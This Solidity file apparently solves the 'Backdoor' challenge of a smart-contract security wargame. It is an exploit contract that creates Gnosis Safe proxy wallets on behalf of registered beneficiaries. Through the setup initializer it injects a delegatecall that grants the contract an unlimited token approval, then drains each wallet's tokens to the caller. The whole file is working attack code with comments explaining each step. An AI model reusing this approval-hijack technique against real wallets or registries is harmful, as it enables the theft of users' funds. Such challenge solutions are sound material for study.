// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {WalletRegistry} from "./WalletRegistry.sol";

/**
 * @title BackdoorExploit
 * @author scorpion9979
 */
contract BackdoorExploit {
    GnosisSafeProxyFactory public immutable walletFactory;
    GnosisSafe public immutable masterCopy;
    WalletRegistry public immutable walletRegistry;
    IERC20 public immutable token;

    constructor(
        GnosisSafeProxyFactory walletFactory_,
        GnosisSafe masterCopy_,
        WalletRegistry walletRegistry_,
        IERC20 token_
    ) {
        walletFactory = walletFactory_;
        masterCopy = masterCopy_;
        walletRegistry = walletRegistry_;
        token = token_;
    }

    function exploit(address[] memory owners) public {
        for (uint i = 0; i < owners.length; i++) {
            // create a wallet
            address[] memory ownerArr = new address[](1);
            ownerArr[0] = owners[i];
            address wallet = address(
                walletFactory.createProxyWithCallback(
                    // _singleton: should be masterCopy
                    address(masterCopy),
                    // initializer: should be GnosisSafe.setup.selector
                    abi.encodeWithSelector(
                        masterCopy.setup.selector,
                        // owners: should be a single owner that is registered as a beneficiary
                        ownerArr,
                        // threshold: should be 1
                        1,
                        // to: should be a contract to delegatecall to
                        address(this),
                        // data: should be a delegatecall to approve the exploit contract to spend the safe's tokens
                        abi.encodeWithSelector(
                            this.approveInfiniteTokenDelegateCall.selector,
                            address(this)
                        ),
                        // fallbackHandler: should be the 0 address
                        address(0),
                        // paymentToken: n/a
                        address(0),
                        // payment: n/a
                        0,
                        // paymentReceiver: n/a
                        address(walletRegistry)
                    ),
                    // saltNonce: doesn't matter
                    i,
                    // callback: should be walletRegistry
                    walletRegistry
                )
            );

            // transfer all tokens to the caller
            token.transferFrom(wallet, msg.sender, token.balanceOf(wallet));
        }
    }

    function approveInfiniteTokenDelegateCall(address spender) public {
        token.approve(spender, type(uint256).max);
    }
}
